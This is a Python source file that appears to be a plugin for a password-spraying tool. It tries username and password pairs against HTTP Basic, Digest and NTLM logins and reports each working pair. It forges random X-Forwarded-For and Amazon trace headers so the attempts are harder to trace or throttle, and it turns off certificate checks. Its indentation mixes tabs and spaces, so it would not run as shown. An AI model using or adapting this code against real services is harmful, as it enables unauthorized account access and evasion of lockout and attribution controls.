import json, datetime, requests, random, requests_ntlm


def generate_ip():

    return ".".join(str(random.randint(0,255)) for _ in range(4))


def generate_id():

    return "".join(random.choice("0123456789abcdefghijklmnopqrstuvwxyz") for _ in range(10))


def generate_trace_id():
    str = "Root=1-"
    first = "".join(random.choice("0123456789abcdef") for _ in range(8))
    second = "".join(random.choice("0123456789abcdef") for _ in range(24))
    return str + first + "-" + second


def httpbrute_authenticate(url, username, password, useragent, pluginargs): # CHANGEME: replace template with plugin name

    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

    data_response = {
        'timestamp': ts,
        'username': username,
        'password': password,
        'success': False,
        'change': False,
        '2fa_enabled': False,
        'type': None,
        'code': None,
        'name': None,
        'action': None,
        'headers': [],
        'cookies': [],
        'sourceip' : None,
        'throttled' : False,
        'error' : False,
        'output' : ""
    }

    spoofed_ip = generate_ip()
    amazon_id = generate_id()
    trace_id = generate_trace_id()

    # CHANGEME: Add more if necessary
    headers = {
        'User-Agent': useragent,
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,
    }


    try:

        resp = None

        full_url = "{}/{}".format(url,pluginargs['uri'])

		if pluginargs['auth'] == 'basic':
			auth = requests.auth.HTTPBasicAuth(username, password)
			resp = requests.get(url=full_url, auth=auth, verify=False, timeout=30)

		elif pluginargs['auth'] == 'digest':
			auth = requests.auth.HTTPDigestAuth(username, password)
			resp = requests.get(url=full_url, auth=auth, verify=False, timeout=30)

		elif pluginargs['auth'] == 'ntlm':
			auth = requests_ntlm.HttpNtlmAuth(username, password)
			resp = requests.get(url=full_url, auth=auth, verify=False, timeout=30)


        if resp.status_code == 200:
            data_response['success'] = True
            data_response['output'] = 'SUCCESS: => {}:{}'.format(username, password)

        elif resp.status_code == 401:
            data_response['success'] = False
            data_response['output'] = 'FAILURE: => {}:{}'.format(username, password)

        else: #fail
            data_response['success'] = False
            data_response['output'] = 'UNKNOWN_RESPONSE_CODE: {} => {}:{}'.format(resp.status_code, username, password)


    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
